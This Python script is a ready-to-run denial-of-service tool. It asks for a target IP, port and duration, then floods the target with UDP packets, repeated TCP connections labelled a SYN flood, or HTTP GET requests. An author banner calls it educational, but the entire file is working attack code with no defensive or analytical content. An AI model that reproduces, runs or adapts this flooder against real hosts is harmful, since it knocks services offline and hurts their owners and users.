#!/bin/python3

from termcolor import colored
import sys
import os
import time
import socket 
import random

os.system("clear")
os.system("figlet DoS")

print()
print(colored("Author   : Javis Wahome", 'green'))
print(colored("Website : https://jakefatha.github.io/", 'magenta'))
print(colored("Github   : https://github.com/Jakefatha", 'red'))
print(colored("Linkedin : https://www.linkedin.com/in/javis-w-00363923a/", 'magenta'))
print(colored("Twitter : https://twitter.com/jakefatha", 'green'))
print(colored("Offense is always the best defense!", 'magenta'))
print(colored("This tool is written for Educational purposes only - helping the defensive team look into how such attacks take place."))
print(colored("I am not responsible for misusing it and must have an NDA signed to perform such attacks", 'red'))
print()

ip = input("Enter the target IP: ")
try:
    port = int(input("Enter the target port: "))
except ValueError:
    print("Invalid port. Exiting...")
    sys.exit()

try:
    dur = int(input("Enter the duration of the attack in seconds: "))
except ValueError:
    print("Invalid duration. Exiting...")
    sys.exit()



def udp_flood(ip, port, message, dur):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(dur)
    target = (ip, port)
    start_time = time.time()
    packet_count = 0
    while True:
        try:
            s.sendto(message, target)
            packet_count += 1
            print(f"Sent packet {packet_count}")
        except socket.error:
            break

        if time.time() - start_time >= dur:
            break

    s.close()

def syn_flood(ip, port, duration):
    sent = 0
    timeout = time.time() + int(duration)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sent += 1
            print(f"SYN Packets sent: {sent} to target: {ip}")
            sock.close()
        except OSError:
            pass
        except KeyboardInterrupt:
            print("\n[*] Attack stopped.")
            sys.exit()
        finally:
            sock.close()  

def http_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"

    sent = 0
    timeout = time.time() + int(dur)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(http_request)
            sent += 1
            print(f"HTTP Packets sent: {sent} to target: {ip}")
        except KeyboardInterrupt:
            print("\n[-] Attack stopped by user")
            break
    sock.close()

attack_type = input(colored(
    "Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))

if attack_type == "1":
    message = b"Sending 1337 packets baby"
    print(colored("UDP attack selected", "red"))
    udp_flood(ip, port, message, dur)
    print(colored("UDP attack completed", "red"))
elif attack_type == "3":
    print(colored("SYN attack selected", "red"))
    syn_flood(ip, port, dur)
elif attack_type == "2":
    print(colored("HTTP attack selected", "red"))
    http_flood(ip, port, dur)
else:
    print(colored("Invalid attack type. Exiting...", "green"))
    sys.exit()
